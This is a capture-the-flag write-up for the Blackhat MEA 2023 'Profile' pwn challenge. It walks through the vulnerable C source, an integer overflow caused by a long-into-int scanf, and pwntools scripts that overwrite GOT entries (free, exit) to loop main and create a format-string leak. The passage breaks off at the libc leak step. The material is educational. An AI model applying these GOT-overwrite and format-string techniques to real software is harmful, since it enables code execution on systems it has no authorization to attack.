---
title: Blackhat MEA '23 Quals - Pwn - Profile
date: '2023-10-09'
tags: ['ctf', 'pwn', 'blackhat', 'blackhatmea', 'blackhatmea23', 'interger-overflow', 'fsb', 'format-string', 'leak', 'aslr-bypass']
draft: false
summary: Exploiting an integer overflow with FSB to leak the libc address and then overwriting the GOT entry of `free` with `system` to get a shell.
---

## Challenge Description

![Alt text](/static/writeups/blackhatmea23-quals/image.png)

## Solution

For this challenge, we were given the source code, let's firstly check the security protections enabled on the binary.
![Alt text](/static/writeups/blackhatmea23-quals/image-1.png)

So, we can see that PIE is disabled and we have `Partial RELRO` which means that we can overwrite the **Global Offset Table** (GOT). We can study more about Relocation Read-Only (RELRO) in this [link](https://ctf101.org/binary-exploitation/relocation-read-only/).

Let's statically analyze the source code to check for any apparent vulnerabilities.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

struct person_t {
  int id;
  int age;
  char *name;
};

void get_value(const char *msg, void *pval) {
  printf("%s", msg);
  if (scanf("%ld%*c", (long*)pval) != 1)
    exit(1);
}

void get_string(const char *msg, char **pbuf) {
  size_t n;
  printf("%s", msg);
  getline(pbuf, &n, stdin);
  (*pbuf)[strcspn(*pbuf, "\n")] = '\0';
}

int main() {
  struct person_t employee = { 0 };

  employee.id = rand() % 10000;
  get_value("Age: ", &employee.age);
  if (employee.age < 0) {
    puts("[-] Invalid age");
    exit(1);
  }
  get_string("Name: ", &employee.name);
  printf("----------------\n"
         "ID: %04d\n"
         "Name: %s\n"
         "Age: %d\n"
         "----------------\n",
         employee.id, employee.name, employee.age);

  free(employee.name);
  exit(0);
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  srand(time(NULL));
}
```

So, we can see that the program is firstly initializing the `employee` structure with a random `id` and then asking for the `age` and `name` of the employee. Then it's printing the `id`, `name` and `age` of the employee. Then it's freeing the `name` of the employee. The bug exists in the `get_value` function:

```c
void get_value(const char *msg, void *pval) {
  printf("%s", msg);
  if (scanf("%ld%*c", (long*)pval) != 1)
    exit(1);
}
```

The problem here is, we're using `scanf` to invoke the `long` format specifier to read the input. But, we're typecasting the `void` pointer to `long` pointer. This is a problem because the size of `long` is 8 bytes and the size of `int` is 4 bytes. So, we can overflow the `id` variable and overwrite the `age` variable. The invocation of `get_value` function which is vulnerable is:

```c
get_value("Age: ", &employee.age);
```

This gives us an integer overflow, but. Since, `age` is part of the struct `person_t`, it allows us to overwrite the `name` attribute which is of type `char*` meaning we can overwrite the pointer itself and make it point to anything that we can.

```c
struct person_t {
  int id;
  int age;
  char *name;
};
```

Because of this overwrite of the pointer, we can write whatever we want and essentially gaining an arbitrary write primitive.

Now, in order to exploit this, we must follow the following path:

1. Overwrite a function in `GOT` to give us an N number of writes i.e. overwriting with `main`.
2. Overwrite another function in `GOT` with `printf` to give us an `fsb` vulnerability
3. Leak the `libc` address using the `fsb` vulnerability
4. Overwrite the `free` function in `GOT` with `system` to get a shell.

Theoretically, this is the path that we must follow. Let's try and implement each of these steps.

### Overwriting a function in GOT to give us an N number of writes

For this to work, we must firstly start by the integer overflow we had found during our static analysis. Now, again, analysing the code, we can see that in the main, after invoking everything, we're calling `free`, and free function does exist in the `GOT` table. So, we can overwrite the `free` function with `main` which will give us an `N` number of arbitary writes.

```c:main
int main() {
  struct person_t employee = { 0 };

  employee.id = rand() % 10000;
  get_value("Age: ", &employee.age);
  if (employee.age < 0) {
    puts("[-] Invalid age");
    exit(1);
  }
  get_string("Name: ", &employee.name);
  printf("----------------\n"
         "ID: %04d\n"
         "Name: %s\n"
         "Age: %d\n"
         "----------------\n",
         employee.id, employee.name, employee.age);

  free(employee.name);
  exit(0);
}
```

Now, for integer overflow, I wrote a simple function in python that will take an address, and then bit shift it to the left by 32 bits and then add 1 to it, this will allow us to overflow the `id` variable and overwrite the `age` variable's pointer.

```python
def overflow(addr: int):
    return str((addr << 32) + 1)
```

Now, this will do the overflow, the next thing we need to do is to overwrite the data at the address i.e. we need to write the address of the function at this overflown address. The `exploit.py`, so far becomes:

```python
#!/usr/bin/env python3

from pwn import *

def overflow(addr: int):
	return str((addr << 32) + 1)

elf = context.binary = ELF("./profile")
io = process()

p.sendlineafter(b"Age", overflow(elf.got.free))
p.sendlineafter(b"Name: ", p32(0x41424344))
```

Now, I ran this script using the GDB and set the breakpoints at `free` and `main` to check the values, the exploit.py script becomes:

```python
#!/usr/bin/env python3

from pwn import *

def overflow(addr: int):
    return str((addr << 32) + 1).encode()

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF("./profile")
# io = process()

gdbscript = '''
init-pwndbg
b *main
b *free
continue
'''
io = gdb.debug(['./profile'], gdbscript=gdbscript)

io.sendlineafter(b"Age", overflow(elf.got.free))
io.sendlineafter(b'Name: ', p32(0x41424344))
```

Now, when running this, i got the following output

![Alt text](/static/writeups/blackhatmea23-quals/image-2.png)

> One thing that I noticed, was that each address was of 3-bytes, (Notice `RSP` i.e. `0x401461`), so for each of the address, I did `[:-1]` to remove the last byte. This will allow us to write the address correctly.

Now, since we know that our integer overflow is allowing us to arbitrary overwrite free, instead of `0x41424344`, let's overwrite it to main, and see if we can get an `N` number of writes.

```python
## Keeping the rest of the exploit same:
io.sendlineafter(b'Name: ', p32(elf.sym.main))
```

![Alt text](/static/writeups/blackhatmea23-quals/image-3.png)

We got an error, `Invalid address 0xa0040138c`. The problem here is, as we already noticed before is that each address is of `3 bytes`, (once again noticing the: `RSP  0x7ffd4060db58 —▸ 0x401461 (main+213)`). And the main address is: `0xa0040138c`. If we simply print out `elf.sym.main`, we get:

```python
log.info("Main Address: %#x" % elf.sym.main)
```

![Alt text](/static/writeups/blackhatmea23-quals/image-4.png)

So, in order to fix this, we must limit the output to `3 bytes` only. We can do this by using the `[:-1]` when 32-bit-packing the address or, `[:3]`. Both of this will do the same thing. The updated `exploit.py` becomes:

```python
#!/usr/bin/env python3

from pwn import *

def overflow(addr: int):
	return str((addr << 32) + 1).encode()

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF("./profile")
# io = process()

gdbscript = '''
init-pwndbg
b *main
b *free
continue
'''
io = gdb.debug(['./profile'], gdbscript=gdbscript)

io.sendlineafter(b"Age", overflow(elf.got.free))
io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
```

![Alt text](/static/writeups/blackhatmea23-quals/image-5.png)

By running this, we can see that `free` has been overwritten with `main`. Giving us an `N` number of writes. Now, we can move on to the next step.

### Overwriting another function in GOT with printf to give us an fsb vulnerability and hence gives us leaks

Now, since we have `N` functions of arbitrary writes, we can easily overwrite as many primitives as we want.

> During solving, I tried to overwrite exit with main, but it didn't work, it just crashed. So, to fix this, I overwrote free with main and then overwrote exit with main. And then, finally overwriting free with printf to give us the Format String Bug.

Now, firstly, what we need to do, is simply overwrite exit with main, as that will help us maintain the `N` number of writes. After that, what we need to do, is overwrite `free` with `printf` because we control the `name` variable, and this can give us the Format String Bug because we can directly pass the pointer's data as input to `printf` function. Therefore, the next thing which we'll pass is simply "HELLO|%p|%p", to the `Name` input, which will print HELLO and two addresses. (As we have overwritten `free` with `printf`).

So, keeping this in mind, the updated `exploit.py` becomes:

```python
#!/usr/bin/env python3

from pwn import *

def overflow(addr: int):
	return str((addr << 32) + 1).encode()

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF("./profile")
io = process()

log.info("Overwriting free(%#x) with main(%#x)" % (elf.got.free, elf.sym.main))
io.sendlineafter(b"Age: ", overflow(elf.got.free))
io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])

log.info("Overwriting exit(%#x) with main(%#x)" % (elf.got.exit, elf.sym.main))
io.sendlineafter(b"Age: ", overflow(elf.got.exit))
io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])

log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
io.sendlineafter(b"Age: ", overflow(elf.got.free))
io.sendlineafter(b'Name: ', p32(elf.sym.printf)[:3])

io.sendlineafter(b"Age: ", b"1")
io.sendlineafter(b"Name: ", b"HELLO|%p|%p")

print(io.recv())

```

![Alt text](/static/writeups/blackhatmea23-quals/image-6.png)

Well, we can now see that `HELLO`, along with two memory addresses (one is `nil`) has been printed out. This confirms that we have successfully overwritten `free` with `printf` and we have the Format String Bug.

### Leaking the libc address using the fsb vulnerability

Now, we have a Format String Bug, which can give us address leaks. What we have to do now, is find the base-address of the binary.